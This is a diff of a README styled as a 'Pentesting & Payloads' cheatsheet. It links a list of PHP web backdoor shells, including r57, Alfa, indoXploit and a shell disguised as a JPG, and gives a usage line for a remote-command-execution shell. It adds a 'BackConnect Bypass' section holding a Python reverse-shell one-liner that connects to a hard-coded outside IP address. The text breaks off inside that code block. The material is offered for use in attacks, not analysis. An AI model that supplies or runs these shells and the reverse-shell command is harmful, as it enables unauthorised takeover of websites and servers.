@@ -1,18 +1,25 @@
 # Cheatsheet Pentesting & Payloads By [@CallMeRep](https://t.me//CallMeRep)
 
 ## Summary
+* [BackConnect Bypass](#trick-backconnect-bypass)
 * [Tools](#tools)
-* [Shell Backdoor Bypass](#looting-for-passwords)
+* [ Default Index CMS ]
+   * [Index Joomla](https://github.com/t101804/repshare/blob/main/index_joomla.php)
+* [ Shell Backdoor Bypass/Non ]
     * [Alfa Shells](https://github.com/t101804/repshare/blob/main/alfa.php)
     * [Evil Twin Shells](https://github.com/t101804/repshare/blob/main/eviltwin.php)
     * [Gecko Shells](https://github.com/t101804/repshare/blob/main/gk.php)
     * [Gecko JPG Shells](https://github.com/t101804/repshare/blob/main/gkjpg.jpg)
-    * [Open Source Shells By Anon7](https://github.com/t101804/repshare/blob/main/ac.php)
+    * [Open Source Shells](https://github.com/t101804/repshare/blob/main/ac.php)
     * [Commander RCE Shell Bypass](https://github.com/t101804/repshare/blob/main/commander.php) 
     ```
     commander.php?command=[executeurcommand] then the response you can access in /output_command.txt
     ```
-# Trick BackConnect Bypass
+    * [SSI Shell](https://github.com/t101804/repshare/blob/main/ssial.shtml) 
+    * [indoXploit Shell](https://github.com/t101804/repshare/blob/main/idx.php) 
+    * [marijuana shell](https://github.com/t101804/repshare/blob/main/m4rijuana.php) 
+    * [r57 shells](https://github.com/t101804/repshare/blob/main/r.php)
+## Trick BackConnect Bypass
 ## Python 
 ```
 export RHOST="104.248.145.105";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
